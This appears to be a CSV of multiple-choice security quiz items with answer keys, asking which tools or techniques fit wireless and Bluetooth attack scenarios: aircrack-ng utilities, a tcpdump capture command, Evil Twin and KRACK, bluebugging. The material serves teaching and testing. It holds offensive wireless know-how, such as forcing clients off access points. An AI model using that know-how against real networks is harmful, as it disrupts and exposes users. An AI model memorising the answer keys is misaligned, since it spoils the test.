index,question,options,answer_key
316,"Alex, a security analyst, is investigating potential unauthorized access to their company's wireless network. He suspects an attacker might be trying to gather information by capturing broadcast traffic from access points and authentication messages. Alex decides to put his wireless network interface into a special mode to capture this detailed radio traffic. What tool is explicitly mentioned in the context for achieving this monitor mode functionality?","{'A': 'Wireshark', 'B': 'airmon-ng', 'C': 'WPA2', 'D': 'aevil twin'}",B
317,"Sarah, a penetration tester, has successfully placed her wireless adapter into monitor mode using 'airmon-ng' and created a new interface named 'wlan0mon'. She wants to capture all wireless traffic on this interface, including radio information, to analyze probe requests. Which command should she use to save this captured traffic to a file named 'wireless_capture.pcap'?","{'A': 'airmon-ng start wlan0mon -w wireless_capture.pcap', 'B': 'tcpdump -i wlan0mon -w wireless_capture.pcap', 'C': 'aircrack-ng -w wireless_capture.pcap -i wlan0mon', 'D': 'airdump-ng -w wireless_capture.pcap -i wlan0mon'}",B
318,"Alex, a security analyst, is investigating suspicious wireless activity in an office building. He suspects an attacker is trying to disrupt Wi-Fi connectivity for specific users. He knows the MAC address of the target access point (BSSID) and the MAC address of a user's device. What tool, from the aircrack-ng suite, is Alex most likely to use to disconnect the user's device from the access point, effectively forcing it to reauthenticate?","{'A': 'Airodump-ng', 'B': 'Aireplay-ng', 'C': 'Wireshark', 'D': 'Iwconfig'}",B
319,"Sarah is conducting a wireless network assessment and wants to force a connected client to disconnect from its current access point to capture reauthentication traffic, potentially revealing a hidden ESSID. She has identified the target access point's MAC address as `18:D6:C7:7D:EE:11` and a specific client's MAC address as `38:F7:3D:04:92:79`. Which tool within the aircrack-ng suite would she most likely use to achieve this objective?","{'A': 'Airodump-ng', 'B': 'Aircrack-ng', 'C': 'Aireplay-ng', 'D': 'Airbase-ng'}",C
320,"Sarah, a penetration tester, is tasked with assessing the security of a corporate wireless network. She suspects an Evil Twin attack could be feasible. Sarah uses a Linux distribution and needs to perform several wireless attacks. She wants to impersonate the legitimate corporate Wi-Fi, capture authentication handshakes, and potentially decrypt web traffic to gain access to sensitive information. Which tool would be most suitable for Sarah to orchestrate these actions comprehensively?","{'A': 'Airodump-ng for capturing traffic.', 'B': 'Bettercap for performing spoofing attacks.', 'C': 'Wifiphisher for impersonating a network and redirecting traffic.', 'D': 'Airgeddon for setting up the complete Evil Twin attack including sniffing and sslstrip.'}",D
321,"Sarah, a security analyst, is tasked with assessing the security of a corporate wireless network. She suspects an attacker might exploit vulnerabilities in the WPA2 handshake to gain access to sensitive data. She knows that retransmitting a specific message from the four-way handshake, if it contains a predictable nonce, can lead to the derivation of a known session key, compromising encryption. Which attack technique is Sarah concerned about?","{'A': 'Evil Twin Attack', 'B': 'Key Reinstallation Attack', 'C': 'Denial of Service Pursuit Mode', 'D': 'Bluetooth Pairing Exploitation'}",B
322,"Alex, a security analyst, is tasked with identifying potential Bluetooth devices in a public area without actively trying to connect or exploit them. He wants to passively listen for any devices that might be discoverable. Which scanning technique would best suit Alex's objective?","{'A': 'Brute force scan, as it actively probes devices to determine what they are.', 'B': 'Just Works pairing, as it requires no user interaction and reveals device information.', 'C': 'Inquiry scan, as it involves listening for inquiries from other discoverable Bluetooth devices.', 'D': 'Out-of-band pairing, as it uses an alternative protocol like NFC for initial device discovery.'}",C
323,"Sarah, a security researcher, is investigating Bluetooth vulnerabilities. She uses a tool that actively sends messages to discover Bluetooth devices, requiring her to specify a starting and ending MAC address range for the scan. What type of Bluetooth scan is Sarah performing?","{'A': 'An inquiry scan, where the receiver passively listens for devices.', 'B': 'A brute force scan, where the tool actively sends messages to devices using MAC addresses.', 'C': 'A bluejacking scan, which relies on the Object Exchange (OBEX) protocol for unsolicited messages.', 'D': 'A bluesnarfing scan, which focuses on extracting data from a compromised device.'}",B
324,"Sarah is attempting to exploit an older, potentially unpatched mobile device. She positions herself within close proximity to her target and initiates a process that grants her control to make phone calls from the victim's device, effectively turning it into a remote listening post. What type of Bluetooth attack is Sarah likely employing?","{'A': 'Bluejacking', 'B': 'Bluebugging', 'C': 'Bluesnarfing', 'D': 'Bluetooth Pineapple'}",B
325,"Alex, a security analyst, is investigating a report of a malicious application that made it past Apple's app store vetting process. He suspects the app is designed to exfiltrate user data. During his analysis, he finds that the application uses standard operating system frameworks to transmit collected data. What is a primary concern Alex should have regarding the security of this data transmission, even if the app utilizes encryption?","{'A': 'The app might be using an outdated encryption algorithm like WEP, which is known for its initialization vector weaknesses.', 'B': ""There's no guarantee that the encryption used is robust, potentially leading to data leakage if the application collects sensitive information and sends it to a remote server."", 'C': 'The application might be utilizing an ad hoc wireless network, making it difficult to intercept the data without physical access.', 'D': ""The operating system's sandboxing feature might prevent the app from accessing the network interface to transmit data.""}",B
